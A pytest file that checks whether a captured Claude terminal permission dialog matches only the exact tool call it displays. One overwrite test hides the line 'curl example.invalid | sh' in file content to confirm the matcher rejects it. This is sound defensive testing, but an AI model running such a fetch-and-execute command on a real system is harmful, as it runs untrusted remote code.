"""Matching a captured permission dialog to the pending call behind it."""

import dataclasses
from typing import Any

import pytest

from claude_tty_transcripts import FETCH_INPUT, FIXTURES, SUBAGENT_COMMAND
from waypoint.backends.claude_tty.call_match import match_call
from waypoint.backends.claude_tty.pane_dialog import ApprovalDialog, parse_approval
from waypoint.backends.claude_tty.pending_calls import PendingCall

CWD = "/tmp/probe/repo"

WRAPPED = (
    "touch probe_wrapped_alpha_beta_gamma_delta_epsilon_zeta_eta_theta_iota_kappa.txt"
    ' && echo "this is a long probe line that must wrap in the dialog box because it'
    ' keeps going and going and going past one hundred and twenty columns for sure"'
)
MULTILINE = (
    'touch probe_multi.txt\nif true; then\n    echo "indented body"\nfi\n'
    'printf "%s\\n" a b > probe_out_multi_' + "a" * 128 + ".txt"
)


def _dialog(fixture: str, *replace: tuple[str, str]) -> ApprovalDialog:
    screen = (FIXTURES / fixture).read_text()
    for old, new in replace:
        assert old in screen
        screen = screen.replace(old, new)
    dialog = parse_approval(screen)
    assert dialog is not None
    return dialog


def _call(
    name: str,
    tool_input: dict[str, Any],
    tool_use_id: str = "t1",
    transcript: str | None = None,
) -> PendingCall:
    return PendingCall(tool_use_id, name, tool_input, CWD, transcript)


SHOWN_READ: dict[str, Any] = {
    "file_path": "/tmp/probe/outside/a_folder_name_long_enough_to_force_the_"
    "read_dialog_to_hard_wrap_the_path_midway_through_it-here/"
    "readme_outside.txt"
}

# (fixture, the call it shows)
SHOWN: list[tuple[str, str, dict[str, Any]]] = [
    (
        "approval_bash_boxed.txt",
        "Bash",
        {"command": "mkdir -p probe_dir_one", "description": "Create probe dir"},
    ),
    (
        "approval_bash_wrapped_boxed.txt",
        "Bash",
        {"command": WRAPPED, "description": "Create probe file and echo long line"},
    ),
    (
        "approval_bash_multiline_boxed.txt",
        "Bash",
        {
            "command": MULTILINE,
            "description": "Run multi-line probe command",
        },
    ),
    (
        "approval_subagent_bash_decoy.txt",
        "Bash",
        {
            "command": SUBAGENT_COMMAND,
            "description": "Create directory and echo marker text",
        },
    ),
    (
        "approval_bash.txt",
        "Bash",
        {
            "command": "mkdir /tmp/cc-tty-probe/probe_subdir",
            "description": "Create probe_subdir directory",
        },
    ),
    (
        "approval_overwrite.txt",
        "Write",
        {"file_path": f"{CWD}/notes.txt", "content": "replaced\n"},
    ),
    (
        "approval_edit.txt",
        "Edit",
        {"file_path": f"{CWD}/notes.txt", "old_string": "beta", "new_string": "BETA"},
    ),
    ("approval_read_wrapped.txt", "Read", SHOWN_READ),
    (
        "approval_notebook.txt",
        "NotebookEdit",
        {
            "notebook_path": "/tmp/probe/repo/a_notebook_folder_name_that_is_long_"
            "enough_to_wrap_the_path_across_two_dialog_lines_for_the_test/nb.ipynb",
            "cell_id": "c1",
            "new_source": "y = 2",
        },
    ),
    ("approval_fetch_subagent.txt", "WebFetch", FETCH_INPUT),
    (
        "approval_websearch.txt",
        "WebSearch",
        {"query": "tmux capture-pane docs", "mode": "standard"},
    ),
    (
        "approval_agent.txt",
        "Agent",
        {"description": "Say hello greeting", "prompt": "Say hello and stop."},
    ),
    ("approval_skill.txt", "Skill", {"skill": "probe-skill"}),
    (
        "approval_mcp.txt",
        "mcp__probe__remember_note",
        {
            "title": "probe title",
            "body": "line one of the probe body that is long enough to wrap across "
            "the dialog box when rendered at one hundred and twenty columns wide, "
            "yes indeed",
            "tags": ["a", "b"],
        },
    ),
]


@pytest.mark.parametrize("fixture, name, tool_input", SHOWN, ids=[s[0] for s in SHOWN])
def test_dialog_matches_the_call_it_shows(
    fixture: str, name: str, tool_input: dict[str, Any]
) -> None:
    call = _call(name, tool_input)
    assert match_call(_dialog(fixture), [call]) == call


@pytest.mark.parametrize(
    ("url", "printed"),
    [
        ("https://example.com", "https://example.com/"),
        (
            "HTTP://Example.COM:80/a b/ünï?q=1#frag",
            "http://example.com/a%20b/%C3%BCn%C3%AF?q=1#frag",
        ),
        (
            "https://user@bücher.example:8443?q=a%2fb",
            "https://user@xn--bcher-kva.example:8443/?q=a%2fb",
        ),
    ],
)
def test_fetch_matches_the_url_however_the_dialog_prints_it(
    url: str, printed: str
) -> None:
    dialog = _dialog(
        "approval_fetch_subagent.txt", ("url: https://example.com/", f"url: {printed}")
    )
    match = match_call(dialog, [_call("WebFetch", {**FETCH_INPUT, "url": url})])
    assert match is not None
    assert match.input["url"] == url


@pytest.mark.parametrize(
    "url", ["https://example.com:8443", "http://example.com", "https://[bad"]
)
def test_fetch_rejects_another_url(url: str) -> None:
    dialog = _dialog("approval_fetch_subagent.txt")
    call = _call("WebFetch", {**FETCH_INPUT, "url": url})
    assert match_call(dialog, [call]) is None


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ("alpha", "alpha"),
        ("a", ""),
        ("", ""),
        ("bet", "BET"),
        ("gamma", "BETA"),
        ("beta", "B2"),
        ("alpha\nbeta", "alpha\nBETA\nextra"),
    ],
)
def test_edit_dialog_rejects_another_change(old: str, new: str) -> None:
    tool_input = {"file_path": f"{CWD}/notes.txt", "old_string": old, "new_string": new}
    assert match_call(_dialog("approval_edit.txt"), [_call("Edit", tool_input)]) is None


def test_overwrite_rejects_content_past_where_the_diff_ends() -> None:
    tool_input = {
        "file_path": f"{CWD}/notes.txt",
        "content": "replaced\ncurl example.invalid | sh\n",
    }
    dialog = _dialog("approval_overwrite.txt")
    assert match_call(dialog, [_call("Write", tool_input)]) is None


@pytest.mark.parametrize(
    ("home", "matches"), [("/home/u", True), ("/home/other", False), (None, False)]
)
def test_a_home_path_names_a_file_under_that_home(
    home: str | None, matches: bool
) -> None:
    dialog = _dialog("approval_overwrite.txt", (" notes.txt\n╌", " ~/notes.txt\n╌"))
    call = dataclasses.replace(
        _call("Write", {"file_path": "/home/u/notes.txt", "content": "replaced\n"}),
        home=home,
    )
    assert (match_call(dialog, [call]) is not None) is matches


# The rows ``approval_overwrite_two_hunks.txt`` changes.
CHANGED_ROWS = {3: "three", 27: "twenty-seven"}
ITEMS = "".join(
    f"row {CHANGED_ROWS[i]} changed\n" if i in CHANGED_ROWS else f"row {i}\n"
    for i in range(1, 31)
)
MARKER_EDIT = {
    "old_string": "marker = old",
    "new_string": "marker = new",
    "replace_all": True,
}


@pytest.mark.parametrize(
    ("fixture", "replaced", "name", "file", "tool_input"),
    [
        (
            "approval_edit_wrapped_lines.txt",
            (),
            "Edit",
            "wrap.py",
            {"old_string": "value_number_11", "new_string": "value_number_99"},
        ),
        # Only the first of two places is drawn, with a note saying so.
        ("approval_edit_replace_all.txt", (), "Edit", "replace.py", MARKER_EDIT),
        # The note right after a changed line is still not part of it.
        (
            "approval_edit_replace_all.txt",
            ("\n 6  item_06 = 6\n 7  item_07 = 7\n 8  item_08 = 8", ""),
            "Edit",
            "replace.py",
            MARKER_EDIT,
        ),
        (
            "approval_overwrite_two_hunks.txt",
            (),
            "Write",
            "two.txt",
            {"content": ITEMS},
        ),
    ],
)
def test_diff_dialogs_as_claude_draws_them(
    fixture: str,
    replaced: tuple[str, str] | tuple[()],
    name: str,
    file: str,
    tool_input: dict[str, Any],
) -> None:
    dialog = _dialog(fixture, *([replaced] if replaced else []))
    call = _call(name, {"file_path": f"{CWD}/{file}", **tool_input})
    assert match_call(dialog, [call]) is not None


def _notebook(**tool_input: Any) -> PendingCall:
    return _call("NotebookEdit", {"notebook_path": f"{CWD}/nb.ipynb", **tool_input})


BULLETS = {
    "cell_id": "c1",
    "edit_mode": "insert",
    "cell_type": "markdown",
    "new_source": "- list the buckets\n- done",
}


@pytest.mark.parametrize(
    ("fixture", "tool_input", "matches"),
    [
        ("approval_notebook_insert.txt", BULLETS, True),
        # Numbered code, so a line's leading "-" is the cell's own.
        (
            "approval_notebook_insert.txt",
            {**BULLETS, "new_source": "- delete the bucket\n- done"},
            False,
        ),
        ("approval_notebook_insert.txt", {**BULLETS, "cell_id": "c9"}, False),
        ("approval_notebook_insert.txt", {**BULLETS, "edit_mode": "replace"}, False),
        (
            "approval_notebook_delete.txt",
            {"cell_id": "c2", "edit_mode": "delete", "new_source": ""},
            True,
        ),
        (
            "approval_notebook_delete.txt",
            {"cell_id": "c1", "edit_mode": "delete", "new_source": ""},
            False,
        ),
        (
            "approval_notebook_delete.txt",
            {"cell_id": "c2", "new_source": "print('bye')"},
            False,
        ),
    ],
)
def test_notebook_dialog_names_the_change_it_words(
    fixture: str, tool_input: dict[str, Any], matches: bool
) -> None:
    match = match_call(_dialog(fixture), [_notebook(**tool_input)])
    assert (match is not None) is matches


@pytest.mark.parametrize(
    ("middle", "matches"), [("- delete the bucket", True), ("- list it", False)]
)
def test_a_bulleted_line_of_a_new_cell_is_not_a_removed_line(
    middle: str, matches: bool
) -> None:
    dialog = _dialog(
        "approval_notebook_insert.txt",
        ("  1 - list the buckets\n  2 - done", "  1 a\n  2 - delete the bucket\n  3 c"),
    )
    call = _notebook(**{**BULLETS, "new_source": f"a\n{middle}\nc"})
    assert (match_call(dialog, [call]) is not None) is matches


def test_the_no_newline_row_is_not_part_of_the_diff() -> None:
    dialog = _dialog(
        "approval_edit.txt",
        (" 4  gamma\n", " 4  gamma\n    \\ No newline at end of file\n"),
    )
    tool_input = {
        "file_path": f"{CWD}/notes.txt",
        "old_string": "beta",
        "new_string": "BETA",
    }
    assert match_call(dialog, [_call("Edit", tool_input)]) is not None


def test_wrapped_diff_lines_still_have_to_agree() -> None:
    tool_input = {
        "file_path": f"{CWD}/wrap.py",
        "old_string": "value_number_11",
        "new_string": "value_number_98",
    }
    dialog = _dialog("approval_edit_wrapped_lines.txt")
    assert match_call(dialog, [_call("Edit", tool_input)]) is None


def test_new_file_matches_its_whole_content() -> None:
    dialog = _dialog("approval_write.txt")
    path = "/tmp/cc-tty-probe/probe_out.txt"

    def write(content: str, file_path: str = path) -> PendingCall:
        tool_input = {"file_path": file_path, "content": content}
        return PendingCall("t1", "Write", tool_input, "/tmp/cc-tty-probe")

    assert match_call(dialog, [write("waypoint-probe\n")]) is not None
    assert match_call(dialog, [write("waypoint-probe\nmore\n")]) is None
    assert match_call(dialog, [write("waypoint-probe-and-more\n")]) is None
    assert match_call(dialog, [write("waypoint-probe\n", "/x/probe_out.txt")]) is None


@pytest.mark.parametrize(
    "fixture, name, tool_input",
    [
        # A running command the dialog's echo mentions, not the one asked.
        ("approval_subagent_bash_decoy.txt", "Bash", {"command": "sleep 60"}),
        # Only the first line of a multi-line command.
        ("approval_bash_multiline_boxed.txt", "Bash", {"command": "touch probe_multi"}),
        # The same command under another description.
        (
            "approval_bash_boxed.txt",
            "Bash",
            {"command": "mkdir -p probe_dir_one", "description": "Something else"},
        ),
        # Spacing changes the command.
        ("approval_bash_boxed.txt", "Bash", {"command": "mkdir -pprobe_dir_one"}),
        (
            "approval_edit.txt",
            "Edit",
            {"file_path": f"{CWD}/n2.txt", "old_string": "beta", "new_string": "BETA"},
        ),
        ("approval_websearch.txt", "WebSearch", {"query": "tmux capture-pane"}),
        ("approval_skill.txt", "Skill", {"skill": "other-skill"}),
        (
            "approval_mcp.txt",
            "mcp__probe__remember_note",
            {"title": "probe", "body": "line one", "tags": ["a"]},
        ),
        ("approval_mcp.txt", "mcp__other__remember_note", {}),
        (
            "approval_fetch_subagent.txt",
            "WebFetch",
            {"url": "https://example.com/other", "prompt": "p"},
        ),
    ],
)
def test_dialog_rejects_a_call_it_does_not_show(
    fixture: str, name: str, tool_input: dict[str, Any]
) -> None:
    assert match_call(_dialog(fixture), [_call(name, tool_input)]) is None


def test_identical_calls_of_one_transcript_prompt_in_order() -> None:
    dialog = _dialog("approval_bash_boxed.txt")
    tool_input = SHOWN[0][2]
    first, second = _call("Bash", tool_input, "a"), _call("Bash", tool_input, "b")
    assert match_call(dialog, [first, second]) == first
    assert match_call(dialog, [first, second], excluded={"a"}) == second


@pytest.mark.parametrize(
    "other",
    [
        {"transcript": "/s/agent-2.jsonl"},
        {"tool_input": {**SHOWN[0][2], "timeout": 90000}},
    ],
    ids=["another-transcript", "differing-input"],
)
def test_calls_that_cannot_be_told_apart_are_not_named(other: dict[str, Any]) -> None:
    dialog = _dialog("approval_bash_boxed.txt")
    first = _call("Bash", SHOWN[0][2], "a", "/s/agent-1.jsonl")
    second = _call(
        "Bash",
        other.get("tool_input", SHOWN[0][2]),
        "b",
        other.get("transcript", "/s/agent-1.jsonl"),
    )
    assert match_call(dialog, [first, second]) is None


def test_cut_off_dialog_matches_nothing() -> None:
    dialog = _dialog("overflow_bash.txt")
    call = _call("Bash", {"command": 'echo "bigtree created with 70 items"'})
    assert not dialog.matchable
    assert match_call(dialog, [call]) is None


_NARROW = (
    'touch probe_a.txt\n\nif true; then\n    echo "indented body"\nfi\n'
    "echo one two three four five six seven eight nine ten eleven twelve thirteen "
    "fourteen fifteen sixteen seventeen eighteen nineteen twenty twentyone twentytwo"
    " > probe_out.txt"
)


def _bash(command: str, description: str, **extra: Any) -> PendingCall:
    return _call("Bash", {"command": command, "description": description, **extra})


def test_blank_lines_and_wraps_match_at_another_width() -> None:
    dialog = _dialog("approval_bash_multiline_narrow.txt")
    call = _bash(_NARROW, "Probe run from the general-purpose agent")
    assert dialog.width == 50
    assert match_call(dialog, [call]) == call


@pytest.mark.parametrize(
    "command",
    [
        MULTILINE.replace("\n", " "),
        MULTILINE.replace("then\n    echo", "then echo"),
        MULTILINE.replace('body"\nfi', 'body"\n\nfi'),
    ],
    ids=["all-newlines", "one-newline", "blank-line-added"],
)
def test_a_short_line_break_is_a_newline_of_the_command(command: str) -> None:
    dialog = _dialog("approval_bash_multiline_boxed.txt")
    assert match_call(dialog, [_bash(command, "Run multi-line probe command")]) is None


def test_a_newline_the_dialog_does_not_draw_does_not_match() -> None:
    dialog = _dialog("approval_bash_wrapped_boxed.txt")
    command = WRAPPED.replace("probe line", "probe\nline")
    call = _bash(command, "Create probe file and echo long line")
    assert match_call(dialog, [call]) is None


def test_an_edit_keeps_the_diffs_line_breaks() -> None:
    merged = {
        "file_path": f"{CWD}/notes.txt",
        "old_string": "alpha\nbeta",
        "new_string": "alpha BETA",
    }
    assert match_call(_dialog("approval_edit.txt"), [_call("Edit", merged)]) is None
    kept = {**merged, "new_string": "alpha\nBETA"}
    call = _call("Edit", kept)
    assert match_call(_dialog("approval_edit.txt"), [call]) == call


def test_an_edit_deleting_a_line_matches_without_its_newline() -> None:
    dialog = _dialog("approval_edit.txt", (" 2 +BETA\n", ""))
    edit = {"file_path": f"{CWD}/notes.txt", "old_string": "beta", "new_string": ""}
    call = _call("Edit", edit)
    assert match_call(dialog, [call]) == call


@pytest.mark.parametrize(
    ("fixture", "command", "description", "unsandboxed"),
    [
        ("approval_bash_unsandboxed.txt", "mkdir -p probe_dds3", "Probe flags", True),
        (
            "approval_bash_boxed.txt",
            "mkdir -p probe_dir_one",
            "Create probe dir",
            False,
        ),
    ],
)
def test_the_unsandboxed_heading_is_compared(
    fixture: str, command: str, description: str, unsandboxed: bool
) -> None:
    dialog = _dialog(fixture)
    flagged = _bash(command, description, dangerouslyDisableSandbox=True)
    plain = _bash(command, description)
    drawn, other = (flagged, plain) if unsandboxed else (plain, flagged)
    assert match_call(dialog, [drawn]) == drawn
    assert match_call(dialog, [other]) is None


@pytest.mark.parametrize("description", [None, "Create probe", "probe dir", "Other"])
def test_a_bash_description_is_the_one_drawn(description: str | None) -> None:
    dialog = _dialog("approval_bash_boxed.txt")
    tool_input: dict[str, Any] = {"command": "mkdir -p probe_dir_one"}
    if description:
        tool_input["description"] = description
    assert match_call(dialog, [_call("Bash", tool_input)]) is None


@pytest.mark.parametrize(
    ("drawn", "asked", "matches"),
    [
        (" · lines 3-7", {"offset": 3, "limit": 5}, True),
        (" · from line 30", {"offset": 30}, True),
        (" · lines 1-5", {"limit": 5}, True),
        (" · lines 3-7", {"offset": 900, "limit": 5}, False),
        (" · lines 3-7", {}, False),
        ("", {"offset": 3, "limit": 5}, False),
    ],
)
def test_a_partial_read_matches_the_range_drawn(
    drawn: str, asked: dict[str, int], matches: bool
) -> None:
    path = SHOWN_READ["file_path"]
    dialog = _dialog(
        "approval_read_wrapped.txt", ("outside.txt)", f"outside.txt{drawn})")
    )
    call = _call("Read", {"file_path": path, **asked})
    assert (match_call(dialog, [call]) == call) is matches


def _with_command(*drawn: str) -> ApprovalDialog:
    body = "".join(f" │ {line}\n" for line in drawn)
    return _dialog("approval_bash_boxed.txt", (" mkdir -p probe_dir_one\n", body))


def test_a_word_is_split_only_over_a_full_line() -> None:
    tail = "x" * 112
    dialog = _with_command("rm -rf build", tail)
    call = _bash("rm -rf build" + tail, "Create probe dir")
    assert match_call(dialog, [call]) is None


def test_wide_characters_count_two_columns_towards_a_wrap() -> None:
    wide = "漢" * 55
    dialog = _with_command(f"echo {wide}", "done")
    call = _bash(f"echo {wide} done", "Create probe dir")
    assert match_call(dialog, [call]) == call


def test_a_call_without_a_description_draws_a_stock_one() -> None:
    dialog = _dialog(
        "approval_bash_boxed.txt", ("Create probe dir\n", "Run shell command\n")
    )
    call = _call("Bash", {"command": "mkdir -p probe_dir_one"})
    assert match_call(dialog, [call]) == call
    described = _bash("mkdir -p probe_dir_one", "Create probe dir")
    assert match_call(dialog, [described]) is None


def test_a_long_first_word_below_the_tip_is_the_description() -> None:
    # Too wide to have fitted after the tip, as a wrapped line would be.
    description = "説明" * 20
    dialog = _dialog(
        "approval_bash_boxed.txt", (" Create probe dir\n", f" {description}\n")
    )
    assert [line.strip() for line in dialog.described_header] == [description]
    call = _bash("mkdir -p probe_dir_one", description)
    assert match_call(dialog, [call]) == call


def test_a_pdf_read_matches_the_pages_drawn() -> None:
    drawn = ("outside.txt)", "outside.txt · pages 1-3)")
    dialog = _dialog("approval_read_wrapped.txt", drawn)
    call = _call("Read", {**SHOWN_READ, "pages": "1-3"})
    assert match_call(dialog, [call]) == call
    other = _call("Read", {**SHOWN_READ, "pages": "1-4"})
    assert match_call(dialog, [other]) is None
